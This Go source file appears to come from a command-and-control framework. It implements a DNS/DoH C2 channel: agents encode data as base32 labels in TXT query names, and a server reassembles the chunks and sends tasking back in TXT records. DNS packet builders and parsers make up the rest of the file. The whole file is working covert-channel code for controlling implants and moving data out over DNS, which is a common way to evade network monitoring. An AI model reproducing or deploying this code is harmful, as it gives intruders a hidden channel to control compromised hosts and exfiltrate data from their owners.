package handlers

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
)

// DNS/DoH C2 Protocol
//
// Uplink (agent -> TS) in DNS TXT query QNAME:
//   <hdr_b32>.<d0_b32>[.<d1_b32>[.<d2_b32>]].basedomain
//
// Header (9 bytes -> 15 b32 chars):
//   [type:1B][agentid:4B][chunk_seq:2B][chunk_tot:2B]
//
// Types: 0x00=poll  0x01=data
// Data labels: 39 bytes each -> 63 b32 chars, max 3 labels -> 117 bytes/query.
//
// Downlink (TS -> agent) in TXT record:
//   base32([is_last:1B][data...])   is_last=1 means no more chunks.

const (
	dnsTypeData = byte(0x01)
	dnsTypePoll = byte(0x00)
	dnsRespMax  = 150 // max raw bytes per TXT response chunk
)

// Reassembly / response state (per active DNS listener).
type dnsState struct {
	chunksMu sync.Mutex
	chunks   map[uint32]*dnsChunkBuf

	respMu sync.Mutex
	resps  map[uint32][]byte
}

func newDNSState() *dnsState {
	return &dnsState{
		chunks: make(map[uint32]*dnsChunkBuf),
		resps:  make(map[uint32][]byte),
	}
}

type dnsChunkBuf struct {
	data  map[uint16][]byte
	total uint16
}

// acceptChunk buffers one incoming chunk for agentID.
// Returns the reassembled frame when all chunks are present, nil otherwise.
func (s *dnsState) acceptChunk(agentID uint32, seq, tot uint16, chunk []byte) []byte {
	s.chunksMu.Lock()
	defer s.chunksMu.Unlock()

	if tot == 0 {
		return nil
	}

	buf, ok := s.chunks[agentID]
	if !ok || buf.total != tot {
		buf = &dnsChunkBuf{data: make(map[uint16][]byte), total: tot}
		s.chunks[agentID] = buf
	}
	cp := make([]byte, len(chunk))
	copy(cp, chunk)
	buf.data[seq] = cp

	if uint16(len(buf.data)) < tot {
		return nil
	}
	var out []byte
	for i := uint16(0); i < tot; i++ {
		out = append(out, buf.data[i]...)
	}
	delete(s.chunks, agentID)
	return out
}

// queueResponse stores the full C2 response for agentID.
func (s *dnsState) queueResponse(agentID uint32, data []byte) {
	s.respMu.Lock()
	defer s.respMu.Unlock()
	cp := make([]byte, len(data))
	copy(cp, data)
	s.resps[agentID] = cp
}

// dequeueChunk returns the next response chunk prefixed with is_last byte.
// is_last=1 means no more data.
func (s *dnsState) dequeueChunk(agentID uint32) []byte {
	s.respMu.Lock()
	defer s.respMu.Unlock()

	data := s.resps[agentID]
	if len(data) == 0 {
		delete(s.resps, agentID)
		return []byte{0x01} // last, empty
	}

	n := len(data)
	if n > dnsRespMax {
		n = dnsRespMax
	}
	chunk := data[:n]
	s.resps[agentID] = data[n:]

	isLast := byte(0x01)
	if len(s.resps[agentID]) > 0 {
		isLast = 0x00
	} else {
		delete(s.resps, agentID)
	}

	out := make([]byte, 1+len(chunk))
	out[0] = isLast
	copy(out[1:], chunk)
	return out
}

// --- Base32 (RFC 4648, no padding) ---

const b32Alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"

var b32DecTab [128]int8

func init() {
	for i := range b32DecTab {
		b32DecTab[i] = -1
	}
	for i, c := range b32Alpha {
		b32DecTab[c] = int8(i)
		if c >= 'A' && c <= 'Z' {
			b32DecTab[c+32] = int8(i)
		}
	}
}

func b32Enc(src []byte) string {
	var sb strings.Builder
	sb.Grow((len(src)*8 + 4) / 5)
	var acc uint64
	var bits int
	for _, b := range src {
		acc = (acc << 8) | uint64(b)
		bits += 8
		for bits >= 5 {
			bits -= 5
			sb.WriteByte(b32Alpha[(acc>>uint(bits))&0x1F])
		}
	}
	if bits > 0 {
		sb.WriteByte(b32Alpha[(acc<<uint(5-bits))&0x1F])
	}
	return sb.String()
}

func b32Dec(s string) ([]byte, error) {
	var acc uint64
	var bits int
	var out []byte
	for _, c := range s {
		if c >= 128 {
			return nil, fmt.Errorf("invalid b32 char %c", c)
		}
		v := b32DecTab[c]
		if v < 0 {
			continue
		}
		acc = (acc << 5) | uint64(v)
		bits += 5
		if bits >= 8 {
			bits -= 8
			out = append(out, byte(acc>>uint(bits)))
		}
	}
	return out, nil
}

// --- QNAME encoding / decoding ---

// encodeQname builds: <hdr_b32>.<d0>[.<d1>[.<d2>]].baseDomain
func encodeQname(msgType byte, agentID uint32, seq, tot uint16, data []byte, baseDomain string) string {
	hdr := make([]byte, 9)
	hdr[0] = msgType
	binary.BigEndian.PutUint32(hdr[1:], agentID)
	binary.BigEndian.PutUint16(hdr[5:], seq)
	binary.BigEndian.PutUint16(hdr[7:], tot)

	labels := []string{b32Enc(hdr)}
	for off := 0; off < len(data); off += 39 {
		end := off + 39
		if end > len(data) {
			end = len(data)
		}
		labels = append(labels, b32Enc(data[off:end]))
	}
	labels = append(labels, baseDomain)
	return strings.Join(labels, ".")
}

// decodeQname extracts C2 frame header + data from a QNAME.
func decodeQname(qname, baseDomain string) (msgType byte, agentID uint32, seq, tot uint16, data []byte, err error) {
	suffix := "." + baseDomain
	if strings.HasSuffix(qname, suffix) {
		qname = qname[:len(qname)-len(suffix)]
	} else if strings.EqualFold(qname, baseDomain) {
		qname = ""
	}

	labels := strings.Split(qname, ".")
	if len(labels) == 0 || labels[0] == "" {
		err = fmt.Errorf("empty qname")
		return
	}

	hdr, e := b32Dec(labels[0])
	if e != nil || len(hdr) < 9 {
		err = fmt.Errorf("bad hdr: %v (len=%d)", e, len(hdr))
		return
	}

	msgType = hdr[0]
	agentID = binary.BigEndian.Uint32(hdr[1:5])
	seq = binary.BigEndian.Uint16(hdr[5:7])
	tot = binary.BigEndian.Uint16(hdr[7:9])

	for i := 1; i < len(labels); i++ {
		chunk, e2 := b32Dec(labels[i])
		if e2 != nil {
			break
		}
		data = append(data, chunk...)
	}
	return
}

// --- DNS wire format helpers ---

func dnsReadName(buf []byte, pos int) (name string, next int, err error) {
	var labels []string
	seen := make(map[int]bool)
	origPos := -1

	for pos < len(buf) {
		if seen[pos] {
			return "", 0, fmt.Errorf("DNS name loop at %d", pos)
		}
		seen[pos] = true
		b := buf[pos]
		if b == 0 {
			pos++
			break
		}
		if b&0xC0 == 0xC0 {
			if pos+1 >= len(buf) {
				return "", 0, fmt.Errorf("ptr overrun")
			}
			target := int(binary.BigEndian.Uint16(buf[pos:pos+2]) & 0x3FFF)
			if origPos < 0 {
				origPos = pos + 2
			}
			pos = target
			continue
		}
		end := pos + 1 + int(b)
		if end > len(buf) {
			return "", 0, fmt.Errorf("label overrun")
		}
		labels = append(labels, string(buf[pos+1:end]))
		pos = end
	}
	if origPos >= 0 {
		return strings.Join(labels, "."), origPos, nil
	}
	return strings.Join(labels, "."), pos, nil
}

// dnsParseQueryQname extracts the first QNAME from a DNS query wire frame.
func dnsParseQueryQname(wire []byte) (qname string, txid uint16, ok bool) {
	if len(wire) < 12 {
		return
	}
	txid = binary.BigEndian.Uint16(wire[0:2])
	flags := binary.BigEndian.Uint16(wire[2:4])
	if flags&0x8000 != 0 { // QR bit set -> response
		return
	}
	if binary.BigEndian.Uint16(wire[4:6]) == 0 {
		return
	}
	n, _, err := dnsReadName(wire, 12)
	if err != nil {
		return
	}
	return n, txid, true
}

// dnsWriteQname encodes a dotted-label name as DNS wire labels.
func dnsWriteQname(qname string) []byte {
	var b bytes.Buffer
	for _, label := range strings.Split(qname, ".") {
		b.WriteByte(byte(len(label)))
		b.WriteString(label)
	}
	b.WriteByte(0)
	return b.Bytes()
}

// dnsBuildTXTRdata encodes bytes as DNS TXT RDATA (one string per 255 chars of base32).
func dnsBuildTXTRdata(raw []byte) []byte {
	enc := []byte(b32Enc(raw))
	var rdata []byte
	for len(enc) > 0 {
		n := 255
		if n > len(enc) {
			n = len(enc)
		}
		rdata = append(rdata, byte(n))
		rdata = append(rdata, enc[:n]...)
		enc = enc[n:]
	}
	return rdata
}

// dnsParseTXTRdata decodes DNS TXT RDATA back to raw bytes.
func dnsParseTXTRdata(rdata []byte) ([]byte, error) {
	var b32 strings.Builder
	for i := 0; i < len(rdata); {
		slen := int(rdata[i])
		i++
		if i+slen > len(rdata) {
			return nil, fmt.Errorf("truncated TXT string")
		}
		b32.Write(rdata[i : i+slen])
		i += slen
	}
	return b32Dec(b32.String())
}

// dnsBuildTXTResponse builds a DNS TXT response wire frame.
func dnsBuildTXTResponse(txid uint16, qname string, txtPayload []byte) []byte {
	var buf bytes.Buffer

	qnameBytes := dnsWriteQname(qname)
	rdata := dnsBuildTXTRdata(txtPayload)

	binary.Write(&buf, binary.BigEndian, txid)
	buf.Write([]byte{0x85, 0x80})       // QR+AA+RD+RA, RCODE=0
	buf.Write([]byte{0x00, 0x01})       // QDCOUNT=1
	buf.Write([]byte{0x00, 0x01})       // ANCOUNT=1
	buf.Write([]byte{0x00, 0x00})       // NSCOUNT=0
	buf.Write([]byte{0x00, 0x00})       // ARCOUNT=0
	buf.Write(qnameBytes)               // question QNAME
	buf.Write([]byte{0x00, 0x10, 0x00, 0x01}) // TXT IN
	buf.Write([]byte{0xC0, 0x0C})       // answer name = ptr to question
	buf.Write([]byte{0x00, 0x10})       // TYPE=TXT
	buf.Write([]byte{0x00, 0x01})       // CLASS=IN
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00}) // TTL=0
	binary.Write(&buf, binary.BigEndian, uint16(len(rdata)))
	buf.Write(rdata)
	return buf.Bytes()
}

// dnsBuildQuery builds a DNS TXT query wire frame.
func dnsBuildQuery(txid uint16, qname string) []byte {
	var buf bytes.Buffer
	binary.Write(&buf, binary.BigEndian, txid)
	buf.Write([]byte{0x01, 0x00}) // RD=1
	buf.Write([]byte{0x00, 0x01}) // QDCOUNT=1
	buf.Write([]byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x01}) // AN=0,NS=0,AR=1(EDNS)

	buf.Write(dnsWriteQname(qname))
	buf.Write([]byte{0x00, 0x10, 0x00, 0x01}) // TXT IN

	// EDNS0 OPT: name=root, type=OPT(41), udpsize=4096
	buf.Write([]byte{0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
	return buf.Bytes()
}

// dnsParseTXTAnswer finds the first TXT answer record RDATA in a DNS response.
func dnsParseTXTAnswer(wire []byte) (rdata []byte, err error) {
	if len(wire) < 12 {
		return nil, fmt.Errorf("too short")
	}
	rcode := wire[3] & 0x0F
	if rcode != 0 {
		return nil, fmt.Errorf("rcode %d", rcode)
	}
	ancount := int(binary.BigEndian.Uint16(wire[6:8]))
	if ancount == 0 {
		return nil, nil
	}

	pos := 12
	// Skip question section.
	qdcount := int(binary.BigEndian.Uint16(wire[4:6]))
	for i := 0; i < qdcount && pos < len(wire); i++ {
		_, next, e := dnsReadName(wire, pos)
		if e != nil {
			return nil, e
		}
		pos = next + 4 // skip QTYPE+QCLASS
	}

	// Parse answers.
	for i := 0; i < ancount && pos < len(wire); i++ {
		_, next, e := dnsReadName(wire, pos)
		if e != nil {
			return nil, e
		}
		pos = next
		if pos+10 > len(wire) {
			break
		}
		rtype := binary.BigEndian.Uint16(wire[pos : pos+2])
		pos += 2 + 2 + 4 // type, class, ttl
		rdlen := int(binary.BigEndian.Uint16(wire[pos : pos+2]))
		pos += 2
		if pos+rdlen > len(wire) {
			break
		}
		if rtype == 16 { // TXT
			return wire[pos : pos+rdlen], nil
		}
		pos += rdlen
	}
	return nil, nil
}
